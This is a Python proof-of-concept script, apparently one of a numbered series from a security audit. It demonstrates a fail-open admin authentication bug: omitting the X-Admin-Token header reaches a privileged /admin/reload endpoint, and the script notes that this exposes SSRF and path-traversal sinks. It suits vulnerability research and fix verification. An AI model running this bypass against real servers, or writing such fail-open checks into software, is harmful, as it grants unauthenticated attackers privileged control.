#!/usr/bin/env python3
"""
PoC #8: Fail-open admin authentication (missing-token bypass)
------------------------------------------------------------
Bug: the admin HTTP channel advertises a *required* bearer token
(DNSM_ADMIN_TOKEN, minted per deployment by generate-secrets.sh; legitimate
operator/automation calls send it as `X-Admin-Token:`). The gate in
admin_worker() (dnsm.c) looks like real enforcement - and it does reject a
caller who presents the WRONG token - but it is fail-open: a caller who simply
OMITS the header skips the comparison entirely and is treated as a trusted
local caller. So any unauthenticated client reaches /admin/reload and
/admin/import (and thus the SSRF #4 and traversal #5 sinks) just by not sending
the header.

How this proves it, purely over the wire, without ever knowing the token:
  1. POST /admin/reload with a BOGUS token -> the server rejects it (403),
     proving a token really is checked (this isn't an "auth was never wired up"
     server).
  2. POST /admin/reload with NO token at all -> the server executes the
     privileged reload and returns 200 "reloaded ...".
Step 1 rejecting while step 2 succeeds is the fail-open: presenting a wrong
credential is blocked, but presenting no credential sails through.

Run the server first, then:
    python3 08_admin_auth_bypass.py [host] [admin_port]
"""
import sys
import urllib.error
import urllib.request

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
ADMIN = int(sys.argv[2]) if len(sys.argv) > 2 else 8080


def post_reload(token):
    """POST /admin/reload with an optional X-Admin-Token. Returns (status, body)."""
    url = f"http://{HOST}:{ADMIN}/admin/reload"
    headers = {"X-Admin-Token": token} if token is not None else {}
    req = urllib.request.Request(url, data=b"", headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=6) as r:
            return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")


def main():
    # 1) A wrong token must be rejected - otherwise there is no token to bypass.
    bad_status, _ = post_reload("definitely-not-the-token")
    if bad_status != 403:
        print(f"[-] wrong token was not rejected (got HTTP {bad_status}); admin channel "
              f"has no token check configured - run with DNSM_ADMIN_TOKEN set")
        return 1
    print("[*] wrong X-Admin-Token correctly rejected with 403 (a token IS enforced for bad values)")

    # 2) No token at all must ALSO be rejected if auth were sound. It isn't.
    status, body = post_reload(None)
    if status == 200 and "reloaded" in body:
        print(f"[+] fail-open admin auth confirmed: omitting X-Admin-Token entirely reached the "
              f"privileged /admin/reload (HTTP 200: {body.strip()!r}) - no credential required, "
              f"which is exactly the door #4 (SSRF) and #5 (traversal) walk through")
        return 0
    if status == 403:
        print("[-] missing token was rejected too; admin auth looks enforced (bug fixed?)")
    else:
        print(f"[-] unexpected response to token-less reload: HTTP {status}: {body.strip()!r}")
    return 1


if __name__ == "__main__":
    sys.exit(main())
